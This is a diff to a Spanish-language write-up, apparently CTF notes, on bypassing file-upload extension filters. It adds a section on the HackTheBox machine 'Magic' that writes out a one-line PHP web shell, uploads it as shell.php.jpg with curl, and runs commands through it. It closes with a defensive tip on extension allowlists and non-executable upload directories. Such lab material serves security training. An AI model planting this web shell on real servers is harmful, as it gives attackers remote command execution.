@@ -37,6 +37,18 @@ curl -s http://<HOST>/uploads/test.php5
 - Mayúsculas o punto final en Windows.
 - `.htaccess` para mapear una extensión.
 
+## Caso Magic: `.php.jpg`
+
+En Magic, el filtro solo mira la extensión final y Apache sigue interpretando el archivo por el handler `.php`:
+
+```bash
+printf '<?php system($_GET["c"]); ?>' > shell.php.jpg
+curl -s -b cookies.txt -F "image=@shell.php.jpg" http://magic.htb/upload.php
+curl "http://magic.htb/images/shell.php.jpg?c=id"
+```
+
+La defensa correcta es una lista blanca de extensiones y servir las subidas desde un directorio sin ejecución.
+
 ## Limitaciones
 
 - El servidor debe interpretar la extensión.
